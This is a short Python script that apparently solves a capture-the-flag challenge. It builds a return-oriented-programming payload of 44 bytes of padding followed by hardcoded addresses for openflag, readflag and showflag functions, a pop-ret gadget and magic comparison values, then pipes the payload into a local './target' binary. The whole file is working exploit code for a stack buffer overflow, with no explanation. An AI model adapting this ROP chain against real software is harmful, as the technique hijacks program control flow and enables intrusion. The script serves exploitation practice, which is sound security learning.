#!/usr/bin/python

import subprocess
import sys
import os

# Addresses to functions and values for compares
readflag_addr = "\xc1\x84\x04\x08" # readflag(int,int)
readflag_cmp1 = "\x67\x45\x23\x01"
readflag_cmp2 = "\xef\xcd\xab\x89"

showflag_addr = "\x12\x85\x04\x08"

openflag_addr = "\x7e\x84\x04\x08"
openflag_cmp1 = "\xef\xbe\xad\xde"

# gadgets
popret = "\x11\x83\x04\x08"
dummy = "AAAA"

# Construct the payload
frontpad = 44
payload = 'A'*frontpad + openflag_addr + dummy + popret + openflag_cmp1 + readflag_addr + showflag_addr + readflag_cmp1 + readflag_cmp2

# pass the payload into the program
cmd = ['./target']
ps = subprocess.Popen(cmd,stdin=subprocess.PIPE)
ps.communicate(payload);

